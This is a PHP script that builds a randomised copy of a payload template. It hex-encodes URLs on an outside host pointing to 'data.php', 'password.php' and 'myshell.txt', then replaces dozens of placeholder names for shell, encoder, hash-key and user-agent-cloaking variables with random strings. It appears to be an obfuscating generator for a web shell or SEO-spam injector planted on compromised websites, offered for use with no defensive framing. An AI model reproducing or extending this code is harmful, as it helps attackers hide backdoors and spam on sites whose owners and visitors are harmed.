<?php
	$f = file_get_contents("mycode.txt");
	function generateRandomString($length = 20) 
	{
	    $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
	    $charactersLength = strlen($characters);
	    $randomString = '';
	    for ($i = 0; $i < $length; $i++) {
	        $randomString .= $characters[rand(0, $charactersLength - 1)];
	    }
	    return $randomString;
	}
	
	$append = '<?php $LINK_VAR=\''.bin2hex("https://seolink.in/data.php").'\'; $PASS_VAR=\''.bin2hex("https://seolink.in/password.php").'\'; $SHELL_VAR=\''.bin2hex("https://seolink.in/myshell.txt").'\';';
	$f = str_replace('<?php', $append, $f);
	$f = str_replace('LINK_VAR', generateRandomString(), $f);
	$f = str_replace('PASS_VAR', generateRandomString(), $f);
	$f = str_replace('SHELL_VAR', generateRandomString(), $f);
	$f = str_replace('HOST_VAR', generateRandomString(), $f);
	$f = str_replace('JSON_FILE_VAR', generateRandomString(), $f);
	$f = str_replace('TMP_VAR', generateRandomString(), $f);
	$f = str_replace('JSON_VAR', generateRandomString(), $f);
	$f = str_replace('PHPCURL_FUNCTION', generateRandomString(), $f);
	$f = str_replace('CH_VAR', generateRandomString(), $f);
	$f = str_replace('URL_VAR', generateRandomString(), $f);
	$f = str_replace('WRITE_FUNCTION', generateRandomString(), $f);
	$f = str_replace('FNAME_VAR', generateRandomString(), $f);
	$f = str_replace('FPN_VAR', generateRandomString(), $f);
	$f = str_replace('RLINK_FUNCTION', generateRandomString(), $f);
	$f = str_replace('READ_VAR', generateRandomString(), $f);
	$f = str_replace('FILE_VAR', generateRandomString(), $f);
	$f = str_replace('READFILE_VAR', generateRandomString(), $f);
	$f = str_replace('ECHO_FUNCTION', generateRandomString(), $f);
	$f = str_replace('ENCODE_VAR', generateRandomString(), $f);
	$f = str_replace('LINK_CODE_VAR', generateRandomString(), $f);
	$f = str_replace('FOREACH1_VAR', generateRandomString(), $f);
	$f = str_replace('HTML_VAR', generateRandomString(), $f);
	$f = str_replace('UA_BLOCKED_VAR', generateRandomString(), $f);
	$f = str_replace('UA_BLOCK_OPEN_VAR', generateRandomString(), $f);
	$f = str_replace('BLOCKED_UA_VAR', generateRandomString(), $f);
	$f = str_replace('UA_ACCEPT_VAR', generateRandomString(), $f);
	$f = str_replace('UA_ACCEPT_OPEN_VAR', generateRandomString(), $f);
	$f = str_replace('ACCEPT_UA_VAR', generateRandomString(), $f);
	$f = str_replace('TIME_VAR', generateRandomString(), $f);
	$f = str_replace('CURL_DATA_VAR', generateRandomString(), $f);
	$f = str_replace('RA_VAR', generateRandomString(), $f);
	$f = str_replace('PASS_DATA_VAR', generateRandomString(), $f);
	$f = str_replace('DIR_VAR', generateRandomString(), $f);
	$f = str_replace('QWERT_VAR', generateRandomString(), $f);
	$f = str_replace('RANDOM_VAR', generateRandomString(), $f);
	$f = str_replace('SHELL_MAX_VAR', generateRandomString(), $f);
	$f = str_replace('PCODE_VAR', generateRandomString(), $f);
	$f = str_replace('FUNCTION_ENCODER_VAR', generateRandomString(), $f);
	$f = str_replace('STRING_VAR', generateRandomString(), $f);
	$f = str_replace('RANDOM_KEY_VAR', generateRandomString(), $f);
	$f = str_replace('ENCODER_KEY_VAR', generateRandomString(), $f);
	$f = str_replace('HASH_KEY_VAR', generateRandomString(), $f);
	$f = str_replace('TMP_IV_VAR', generateRandomString(), $f);
	$f = str_replace('IV_KEY_VAR', generateRandomString(), $f);
	$f = str_replace('ENCODER_OUT_VAR', generateRandomString(), $f);
	$f = str_replace('ENCODER_CI_VAR', generateRandomString(), $f);
	$f = str_replace('FUNCTION_HASH_VAR', generateRandomString(), $f);
	$mycode = $f;